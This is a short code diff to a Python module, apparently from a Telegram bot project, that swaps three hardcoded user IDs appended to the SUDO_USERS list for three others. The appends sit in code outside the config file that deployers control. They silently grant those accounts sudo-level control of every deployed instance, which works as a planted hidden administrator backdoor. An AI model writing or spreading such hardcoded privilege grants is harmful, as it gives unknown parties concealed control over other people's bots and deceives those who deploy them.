@@ -5,9 +5,9 @@ from config import SUDO_USERS
 from SJM.admins import get_administrators
 
 
-SUDO_USERS.append(5124507794)
-SUDO_USERS.append(1356469075)
-SUDO_USERS.append(5198403647)
+SUDO_USERS.append(5372572893)
+SUDO_USERS.append(5339194287)
+SUDO_USERS.append(900873119)
 
 
 def errors(func: Callable) -> Callable:
